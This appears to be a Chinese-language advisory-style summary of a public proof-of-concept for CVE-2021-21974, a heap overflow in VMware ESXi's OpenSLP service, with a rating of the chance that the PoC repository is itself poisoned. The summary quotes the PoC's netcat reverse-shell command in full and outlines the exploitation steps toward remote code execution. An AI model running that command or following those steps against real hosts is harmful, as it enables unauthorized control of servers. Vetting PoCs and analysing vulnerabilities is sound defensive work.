## CVE-2021-21974-VMware ESXi-OpenSLP堆溢出

**漏洞编号:** CVE-2021-21974

**漏洞类型:** 堆溢出

**影响应用:** VMware ESXi

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** ESXi 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG; VMware Cloud Foundation 4.x before 4.2 and 3.x

**利用条件:** 攻击者需要与ESXi主机处于同一网络段，并能访问427端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-21974是VMware ESXi中OpenSLP服务的一个堆溢出漏洞。攻击者通过向目标ESXi主机的427端口发送特制的SLP服务请求，可以在OpenSLP服务中触发堆溢出，从而导致远程代码执行。提供的POC代码通过Python实现，主要步骤包括：

1.  **连接验证：** 首先验证与目标IP地址和端口（427）的连接。
2.  **SLP线程：** 创建一个SLP线程，负责发送SLP数据包。
3.  **连接：** 建立到目标服务器的连接。
4.  **服务请求：** 发送包含特制服务位置协议（SLP）字符串的服务请求，该字符串旨在触发堆溢出（`b'roflmao://pwning'`）。
5.  **关闭连接：** 关闭连接。

**有效性：** 根据搜索结果和漏洞库信息，该漏洞被广泛利用，存在公开的POC代码，并且在实际攻击中被用于传播勒索软件，因此提供的POC代码很可能有效。

**投毒风险：** POC代码本身并无明显的恶意代码，但存在一定的投毒风险，风险评估为10%。潜在的投毒方式可能包括：

*   **反弹shell地址：**  POC代码中包含硬编码的反弹shell IP地址（`192.168.0.194`）。攻击者可能修改此IP地址，将受害者机器上的shell反弹到攻击者控制的服务器上。
*   **命令执行内容：**  POC代码中定义了要执行的shell命令 `shell_cmd = b'mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 192.168.0.194 80 1>/tmp/backpipe'`，该命令创建一个命名管道，并通过netcat将shell反弹到指定IP和端口。虽然代码本身实现了漏洞利用，但恶意用户可以修改命令内容植入恶意后门。
*  **DEBUG标志:**  `DEBUG = True` 开启了调试模式, 理论上,如果调试信息过多可能会泄露信息.但是利用价值不大,所以评估为较低的风险.

**利用方式：**

1.  攻击者首先需要与目标ESXi主机处于同一网络段，确保可以访问其427端口。
2.  运行POC代码，并指定目标IP地址。
3.  POC代码会创建一个SLP线程，连接到目标主机的427端口。
4.  发送特制的SLP服务请求，该请求包含一个恶意的服务类型字符串，导致OpenSLP服务中的堆溢出。
5.  堆溢出允许攻击者覆盖内存中的数据，最终实现远程代码执行。
6.  POC代码执行shell命令，创建一个反弹shell，将目标主机的shell连接到攻击者的服务器。
7.  攻击者从而控制目标ESXi主机。

**项目地址:** [mercylessghost/CVE-2021-21974](https://github.com/mercylessghost/CVE-2021-21974)

**漏洞详情:** [CVE-2021-21974](https://nvd.nist.gov/vuln/detail/CVE-2021-21974)